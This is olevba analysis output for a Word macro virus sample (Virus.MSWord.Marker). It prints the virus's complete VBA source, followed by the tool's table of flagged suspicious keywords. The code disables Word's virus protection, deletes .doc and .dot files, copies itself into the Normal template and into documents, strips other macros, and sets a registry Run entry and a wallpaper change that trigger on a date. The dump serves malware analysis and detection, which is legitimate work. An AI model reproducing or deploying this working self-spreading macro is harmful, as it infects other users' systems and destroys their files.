olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Const TJ780611 = "<% this is a mark by TJ780611 V1.00 %>"
Const MarkerA = "<- this is a mark by TJ780611 V1.00b"
Const MarkerB = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
    Document_Close
End Sub
Private Sub Document_Close()
    Dim oNT, oAD, oVBProject As Object
    Dim bNT, bAD As Boolean
    Dim TJY2K As String
    On Error Resume Next
    Options.VirusProtection = False
    AddIns.Unload True
    Kill Options.DefaultFilePath(8) & "\*.doc"
    Kill Options.DefaultFilePath(8) & "\*.dot"
    Application.UserName = "TJ 2000"
    Application.UserInitials = "TJY2K"
    Application.UserAddress = "TJ780611@ThePentagon.Com"
    Application.EnableCancelKey = wdCancelDisabled
    GoSub InsertCode
    GoSub ProbeMacros
    GoSub ShowMe
    GoTo Finish
InsertCode:
    Set oAD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set oNT = NormalTemplate.VBProject.VBComponents.Item(1)
    bAD = oAD.CodeModule.Find(TJ780611, 1, 1, 10000, 10000)
    bNT = oNT.CodeModule.Find(TJ780611, 1, 1, 10000, 10000)
    If (bAD Xor bNT) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
        If bAD Then
            TJY2K = oAD.CodeModule.Lines(1, oAD.CodeModule.CountOfLines)
            oNT.CodeModule.deletelines 1, oNT.CodeModule.CountOfLines
            oNT.CodeModule.AddFromString TJY2K
            NormalTemplate.Save
        End If
        If bNT Then
            TJY2K = oNT.CodeModule.Lines(1, oNT.CodeModule.CountOfLines)
            oAD.CodeModule.deletelines 1, oAD.CodeModule.CountOfLines
            oAD.CodeModule.AddFromString TJY2K
            If Not (ActiveDocument.Saved) Then oAD.Save
        End If
    End If
    Return
ProbeMacros:
    For Each oVBProject In ActiveDocument.VBProject.VBComponents
        If oVBProject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
                Name:=oVBProject.Name, Object:=wdOrganizerObjectProjectItems
            If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
        End If
    Next oVBProject
    For Each oVBProject In NormalTemplate.VBProject.VBComponents
        If oVBProject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
                Name:=oVBProject.Name, Object:=wdOrganizerObjectProjectItems
            NormalTemplate.Save
        End If
    Next oVBProject
    Return
ShowMe:
Dim RootSys As String
Dim strWP As String
On Error Resume Next
    RootSys = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
    RootSys = RootSys & "\TJ.htm"
    If Day(Date) = 11 Then
    Open RootSys For Output As #1
    Print #1, "<html><head><title>Who woman is ... </title></head>"
    Print #1, "<body bgcolor='#FFFF00'>"
    Print #1, "<h1 align='center'><marquee>Woman...</marquee></h1>"
    Print #1, "<p align = 'center'><font size='4'>Woman is created from a rib of a man"
    Print #1, "<br>Not from his head, to be above him"
    Print #1, "<br>Nor his feet, to be walked upon"
    Print #1, "<br>But from his chest, to be hugged"
    Print #1, "<br>Near his arm, to be protected"
    Print #1, "<br>And close to his heart, to be loved</font></p>"
    Print #1, "</body></html>"
    Close #1
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootSys
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Woman") = RootSys
    End If
    strWP = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Woman")
    If Day(Date) > 12 And strWP = RootSys Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Woman") = ""
    End If
Return
Finish:
End Sub

























































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

